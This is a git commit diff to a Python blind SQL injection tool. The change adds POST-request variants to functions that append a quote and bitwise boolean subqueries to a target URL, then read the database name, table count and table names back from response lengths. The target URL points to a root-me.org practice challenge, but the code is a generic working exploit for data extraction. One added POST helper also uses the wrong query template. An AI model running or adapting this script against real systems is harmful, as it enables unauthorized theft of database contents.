5c69ca8acbb5a92b111f5211276e46b8c7e47350
WinterMute1000 <42152852+WinterMute1000@users.noreply.github.com>
2021-12-22 14:09:03 +0900

    add post method

--- bitwise_public.py
+++ bitwise_public.py
@@ -1,10 +1,26 @@
+import requests
+from requests.utils import requote_uri
+from enum import Enum
+
 DATA_COUNT_SHIFT_QUERY = ' and (select substr(lpad(bin(count({0})>>{1}),8,0),8,1)=1)'
 DATA_LENGTH_SHIFT_QUERY = ' and (select substr(lpad(bin(length({0})>>{1}),8,0),8,1)=1)'
 DATA_BIT_SHIFT_QUERY = ' and (select substr(lpad(bin(ascii(substr({0},{1},1))>>{2}),8,0),8,1)=1 LIMIT {3}, 1)'
 # Insert target url
-TARGET_URL = ''
+TARGET_URL = 'http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=3'
 # insert your table name
 TABLE_NAME = ''
+
+# Insert test data for post
+# Must have PARAM_NAME
+DATA_PARAMS = {}
+# Insert test param name for post
+# Param must in data.
+PARAM_NAME = ''
+
+
+class HTTPMethod(Enum):
+    GET = "GET",
+    POST = "POST"
 
 
 def parsing_bin_list_to_decimal(bin_list):
@@ -13,3 +29,39 @@ def parsing_bin_list_to_decimal(bin_list):
 
 def parsing_bin_list_to_char(bin_list):
     return chr(parsing_bin_list_to_decimal(bin_list))
+
+
+# Add get, post
+
+def get_length_by_get_method(query, shift_idx):
+    return len(requests.get(requote_uri(TARGET_URL + '\'' +
+                                        DATA_LENGTH_SHIFT_QUERY.format(query,
+                                                                       shift_idx))).text)
+
+
+def get_length_by_post_method(query, shift_idx, data_params=DATA_PARAMS):
+    data_params[PARAM_NAME] = data_params[PARAM_NAME] + '\'' + DATA_LENGTH_SHIFT_QUERY.format(query, shift_idx)
+    return len(requests.post(url=requote_uri(TARGET_URL), data=data_params).text)
+
+
+def get_count_by_get_method(query, shift_idx):
+    return len(requests.get(requote_uri(TARGET_URL + '\'' +
+                                        DATA_COUNT_SHIFT_QUERY.format(query, shift_idx))).text)
+
+
+def get_count_by_post_method(query, shift_idx,data_params=DATA_PARAMS):
+    data_params[PARAM_NAME] = data_params[PARAM_NAME] + '\'' + DATA_COUNT_SHIFT_QUERY.format(query, shift_idx)
+    return len(requests.post(url=requote_uri(TARGET_URL), data=data_params).text)
+
+
+def get_data_by_get_method(query, data_idx, shift_idx, tuple_idx):
+    return len(requests.get(requote_uri(TARGET_URL + '\'' +
+                                        DATA_BIT_SHIFT_QUERY.format(query, data_idx, shift_idx, tuple_idx))).text)
+
+
+def get_data_by_post_method(query, data_idx, shift_idx, tuple_idx,data_params=DATA_PARAMS):
+    data_params[PARAM_NAME] = data_params[PARAM_NAME] + '\'' + DATA_COUNT_SHIFT_QUERY.format(query,
+                                                                                             data_idx,
+                                                                                             shift_idx,
+                                                                                             tuple_idx)
+    return len(requests.post(url=requote_uri(TARGET_URL), data=data_params).text)
--- get_db_table_information.py
+++ get_db_table_information.py
@@ -18,29 +18,32 @@ class GetDbTableInformationClass:
         self.tables_name = []
 
     # SQL Injection method
-    def get_db_name_length(self):
+    def get_db_name_length(self, method=bitwise_public.HTTPMethod.GET):
         length_bin_list = []
+        query = 'db_name()'
+
         for shift_idx in range(7, -1, -1):
-            res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
-                                                      bitwise_public.DATA_LENGTH_SHIFT_QUERY.format('db_name()',
-                                                                                                    shift_idx)))
-                             .text)
+            res_length = bitwise_public.get_length_by_post_method(query, shift_idx) if method == bitwise_public. \
+                HTTPMethod.POST else bitwise_public.get_length_by_get_method(query, shift_idx)
             length_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))
 
         self.db_name_length = bitwise_public.parsing_bin_list_to_decimal(length_bin_list)
         print(self.db_name_length)
 
-    def get_db_name(self):
+    def get_db_name(self, method=bitwise_public.HTTPMethod.GET):
         # one character list, not string
         db_name_char_list = []
+        query = 'db_name()'
+
         for db_name_idx in range(self.db_name_length):
             db_name_char_bin_list = []
             for shift_idx in range(7, -1, -1):
-                res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
-                                                          bitwise_public.DATA_BIT_SHIFT_QUERY.format('db_name()',
-                                                                                                     db_name_idx + 1,
-                                                                                                     shift_idx,
-                                                                                                     0))).text)
+                res_length = bitwise_public.get_data_by_post_method(query, db_name_idx, shift_idx, 0) if method == \
+                                                                                                         bitwise_public.HTTPMethod.POST else bitwise_public.get_data_by_get_method(
+                    query,
+                    db_name_idx,
+                    shift_idx,
+                    0)
                 db_name_char_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))
 
             db_name_char_list.append(bitwise_public.parsing_bin_list_to_char(db_name_char_bin_list))
@@ -48,51 +51,47 @@ class GetDbTableInformationClass:
         self.db_name = ''.join(db_name_char_list)
         print(self.db_name)
 
-    def get_tables_number(self):
+    def get_tables_number(self, method=bitwise_public.HTTPMethod.GET):
         number_bin_list = []
+        query = """select count(*) from information_schema.tables where table_schema = '{0}'""".format(self.db_name)
+
         for shift_idx in range(7, -1, -1):
             # Need know DB name
-            res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
-                                                      bitwise_public.DATA_COUNT_SHIFT_QUERY.format(
-                                                          """select count(*) from information_schema.tables 
-                                                          where table_schema = '{0}'""".format(self.db_name)
-                                                          , shift_idx))).text)
+            res_length = bitwise_public.get_count_by_post_method(query, shift_idx) if method == bitwise_public \
+                .HTTPMethod.POST else bitwise_public.get_count_by_get_method(query, shift_idx)
             number_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))
 
         self.tables_number = bitwise_public.parsing_bin_list_to_decimal(number_bin_list)
         print(self.tables_number)
 
-    def get_tables_length(self):
+    def get_tables_length(self, method=bitwise_public.HTTPMethod.GET):
         for table_idx in range(self.tables_number):
+            query = """select TABLE_NAME from information_schema.tables where table_schema = '{0}'
+                       limit {1},1""".format(self.db_name, table_idx)
             tables_length_bin_list = []
+
             for shift_idx in range(7, -1, -1):
-                res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
-                                                          bitwise_public.DATA_LENGTH_SHIFT_QUERY.format("""select TABLE_NAME
-                                                          from information_schema.tables where table_schema = '{0}'
-                                                          limit {1},1""".format(self.db_name, table_idx),
-                                                                                                        shift_idx)))
-                                 .text)
+                res_length = bitwise_public.get_length_by_post_method(query, shift_idx) if method == bitwise_public. \
+                    HTTPMethod.POST else bitwise_public.get_length_by_get_method(query, shift_idx)
                 tables_length_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))
 
             self.tables_name_length.append(bitwise_public.parsing_bin_list_to_decimal(tables_length_bin_list))
 
         print(self.tables_name_length)
 
-    def get_tables_name(self):
+    def get_tables_name(self, method=bitwise_public.HTTPMethod.GET):
+        query = """select TABLE_NAME from information_schema.tables 
+                   where table_schema = '{0}'
+                   """.format(self.db_name)
         for table_idx in range(self.tables_number):
             table_char_list = []
             for table_name_idx in range(self.tables_name_length[table_idx]):
                 table_name_char_bin_list = []
                 for shift_idx in range(7, -1, -1):
-                    res_length = len(requests.get(requote_uri(bitwise_public.TARGET_URL + '\'' +
-                                                              bitwise_public.DATA_BIT_SHIFT_QUERY.format("""select 
-                                                              TABLE_NAME from information_schema.tables 
-                                                              where table_schema = '{0}'
-                                                              """.format(self.db_name),
-                                                                                                         table_name_idx,
-                                                                                                         shift_idx,
-                                                                                                         table_idx)))
-                                     .text)
+                    res_length = bitwise_public.get_data_by_post_method(query, table_name_idx, shift_idx, table_idx) \
+                        if method == bitwise_public.HTTPMethod.POST \
+                        else bitwise_public.get_data_by_get_method(query, table_name_idx, shift_idx, table_idx)
+
                     table_name_char_bin_list.append(str(int(res_length == self.SUCCESS_LENGTH)))
 
                 table_char_list.append(bitwise_public.parsing_bin_list_to_char(table_name_char_bin_list))
